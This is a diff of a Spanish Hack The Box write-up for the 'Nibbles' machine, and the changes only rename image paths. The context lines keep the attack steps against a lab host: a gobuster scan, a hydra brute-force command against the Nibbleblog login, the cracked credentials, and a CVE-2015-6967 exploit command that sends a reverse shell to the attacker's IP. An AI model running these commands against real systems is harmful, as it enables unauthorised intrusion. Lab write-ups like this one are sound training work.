@@ -3,7 +3,7 @@ title: "Nibbles - WriteUp"
 date: Fri Nov 01 2024 20:00:00 GMT+0100 (Central European Standard Time)
 categories: [WriteUps, HTB, Linux]
 tags: [ctf, nmap, htb, hydra, dirb, reverse-shell, cve, exploit, cve-2015-6967, apache]
-image: /assets/img/htb-writeups/Pasted image 20240130110126.png
+image: /assets/img/htb-writeups/Pasted-image-20240130110126.png
 ---
 
 {% include machine-info.html
@@ -13,14 +13,14 @@ image: /assets/img/htb-writeups/Pasted image 20240130110126.png
   platform="HTB"
 %}
 
-![Nibbles](/assets/img/htb-writeups/Pasted image 20240130110126.png)
+![Nibbles](/assets/img/htb-writeups/Pasted-image-20240130110126.png)
 
 ---
 
 ---
 ----
 
-![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130110126.png)
+![NIBBLES](/assets/img/htb-writeups/Pasted-image-20240130110126.png)
 
 ----
 
@@ -49,15 +49,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 HTTP
 
-![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130111014.png)
+![NIBBLES](/assets/img/htb-writeups/Pasted-image-20240130111014.png)
 
 Si examinamos el código fuente nos muestra una ruta oculta.
 
-![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130111117.png)
+![NIBBLES](/assets/img/htb-writeups/Pasted-image-20240130111117.png)
 
 Vamos a ver qué contiene.
 
-![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130111421.png)
+![NIBBLES](/assets/img/htb-writeups/Pasted-image-20240130111421.png)
 
 Si pulsamos en las categorías vemos esto en su URL
 
@@ -74,17 +74,17 @@ FUZZING
 $ gobuster dir -u http://10.129.4.29/nibbleblog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php
 ```
 
-![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130115328.png)
+![NIBBLES](/assets/img/htb-writeups/Pasted-image-20240130115328.png)
 
 Encontramos varias rutas interesantes. 
 
-![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130115427.png)
+![NIBBLES](/assets/img/htb-writeups/Pasted-image-20240130115427.png)
 
 Tenemos la versión. 
 
 Panel de login.
 
-![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130123356.png)
+![NIBBLES](/assets/img/htb-writeups/Pasted-image-20240130123356.png)
 
 Hacemos un diccionario de posibles contraseñas con _cewl_:
 
@@ -98,11 +98,11 @@ Lo hacemos del /README también e incluyendo mayúsculas pero después de varias
 $ hydra -l admin -P ./passwords.txt 10.129.4.29 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password."
 ```
 
-![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130122923.png)
+![NIBBLES](/assets/img/htb-writeups/Pasted-image-20240130122923.png)
 
 Después de la fuerza bruta el servidor nos banea y no podemos probar todas las contraseñas por lo que reiniciamos el servidor.
 
-![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130123649.png)
+![NIBBLES](/assets/img/htb-writeups/Pasted-image-20240130123649.png)
 
 ##### NUEVA IP 10.129.4.38
 
@@ -112,7 +112,7 @@ Damos con la combinación ganadora:
 admin:nibbles
 ```
 
-![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130123902.png)
+![NIBBLES](/assets/img/htb-writeups/Pasted-image-20240130123902.png)
 
 Encontramos este script para la explotación inicial y obtener la reverse shell:
 
@@ -128,7 +128,7 @@ Nos bajamos el exploit y lo ejecutamos de la siguiente manera:
 $ python3 cve-2015-6967.py --url http://10.129.4.38/nibbleblog/ --ip 10.10.14.115 -u admin -p nibbles
 ```
 
-![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130125450.png)
+![NIBBLES](/assets/img/htb-writeups/Pasted-image-20240130125450.png)
 
 #### ESCALADA
 
